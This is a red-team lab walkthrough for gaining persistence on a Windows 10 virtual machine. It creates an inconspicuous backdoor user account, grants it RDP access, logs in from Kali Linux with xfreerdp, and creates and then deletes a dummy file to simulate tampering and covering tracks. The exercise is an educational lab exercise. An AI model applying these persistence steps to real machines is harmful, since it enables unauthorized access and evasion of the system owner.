# Red Teaming: Persist On A Windows Machine With A Malicious User Account

---

## Objectives
* Create an inconspicuous local user account on a Windows 10 virtual machine to simulate a backdoor account.
* Establish an RDP connection from a separate Kali Linux machine using the created account.
* Navigate the Windows file system to demonstrate the account's access and subtle presence.
* Create a dummy file in a controlled directory to simulate unauthorized file manipulation.
* Delete the dummy file to simulate an attempt to cover tracks.

---

## Lab Environment

| Machine | Operating System | IP Address     | Role       |
| ------- | ---------------- | -------------- | ---------- |
| Target  | Windows 10       | `192.168.1.8`  | RDP target |
| Source  | Kali Linux       | `192.168.1.14` | RDP client |

Network configuration: **Bridged Adapter**

---

# Tools
* **Windows 10** — Target virtual machine used to create the local training account and provide RDP access.
* **Kali Linux** — Separate virtual machine used to initiate and demonstrate the RDP connection.
* **PowerShell** — Used to create and configure the local Windows training account and perform file-system operations.
* **FreeRDP (`xfreerdp`)** — Used from Kali Linux to establish the RDP connection to the Windows target.
* **Command Prompt** — Used to verify the logged-in account and demonstrate access to the Windows system.

---

# Steps

## Step 1 — Verify the Windows Target IP

On the Windows 10 target, open PowerShell and run:

```powershell
ipconfig
```

Confirm that the Windows target uses:

```text
192.168.1.8
```

## Step 2 — Verify Connectivity from Kali

On Kali Linux:

```bash
ping -c 4 192.168.1.8
```

## Step 3 — Create the Inconspicuous Training Account

On Windows 10, open **PowerShell as Administrator**.

Create the local account:

```powershell
net user LabBackdoorDemo "P@ssw0rd-Lab-2026!" /add
```

The command should return:

```text
The command completed successfully.
```

## Step 4 — Add the Account to Remote Desktop Users

Still in **Administrator PowerShell**:

```powershell
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "LabBackdoorDemo"
```

Verify membership:

```powershell
Get-LocalGroupMember "Remote Desktop Users"
```

The output should contain:

```text
LabBackdoorDemo
```


## Step 5 — Enable Remote Desktop

On Windows 10, open:

```text
Settings
→ System
→ Remote Desktop
```

Enable:

```text
Remote Desktop
```

## Step 6 — Verify RDP Port

From Kali Linux:

```bash
nc -zv 192.168.1.8 3389
```

Expected result:

```text
192.168.1.8 3389 (ms-wbt-server) open
```

## Step 7 — Install FreeRDP on Kali

If `xfreerdp` is not installed:

```bash
sudo apt update
sudo apt install freerdp-x11
```

Verify the installation:

```bash
xfreerdp /version
```

## Step 8 — Initiate the RDP Connection

From Kali Linux:

```bash
xfreerdp /v:192.168.1.8 /u:'.\LabBackdoorDemo' /cert:ignore
```

When prompted for the password, enter:

```text
P@ssw0rd-Lab-2026!
```

## Step 9 — Verify the Logged-In Account

Inside the Windows 10 RDP session, open Command Prompt:

```cmd
whoami
```

The result should identify the `LabBackdoorDemo` account, for example:

```text
desktop-og0bhkd\labbackdoordemo
```

Also run:

```cmd
hostname
```

## Step 10 — Navigate the Windows Directories

Inside the Windows RDP session, open File Explorer.

Navigate through normal Windows directories such as:

```text
C:\
```

and:

```text
C:\Users
```

Then open the training directory created for this exercise:

```text
C:\SecurityLab
```

## Step 11 — Create the Controlled Sensitive-Demo Directory

Open PowerShell inside the Windows RDP session:

```powershell
New-Item -ItemType Directory -Path "C:\SecurityLab\SensitiveDemo" -Force
```

Navigate to it:

```powershell
cd C:\SecurityLab\SensitiveDemo
```

Verify the current location:

```powershell
Get-Location
```

Expected:

```text
C:\SecurityLab\SensitiveDemo
```

## Step 12 — Create the Dummy File

Create a harmless training file:

```powershell
"SIMULATED SECURITY BREACH - TRAINING DATA ONLY" | Out-File dummy_breach.txt
```

Verify that the file exists:

```powershell
Get-ChildItem
```

Read the file:

```powershell
Get-Content dummy_breach.txt
```

Expected output:

```text
SIMULATED SECURITY BREACH - TRAINING DATA ONLY
```

---

## Step 13 — Demonstrate File Manipulation

The dummy file created in the controlled training directory can now be demonstrated as an example of unauthorized file manipulation.

Display its contents again:

```powershell
Get-Content dummy_breach.txt
```

This provides evidence for the video demonstration that the authenticated account has access to the file.

## Step 14 — Delete the Dummy File

Delete the simulated breach file:

```powershell
Remove-Item dummy_breach.txt
```

Then verify the directory contents:

```powershell
Get-ChildItem
```

The `dummy_breach.txt` file should no longer appear.

---

## My Solution:

[View My Solution:](https://youtu.be/fGnVPU5b5tw)

---
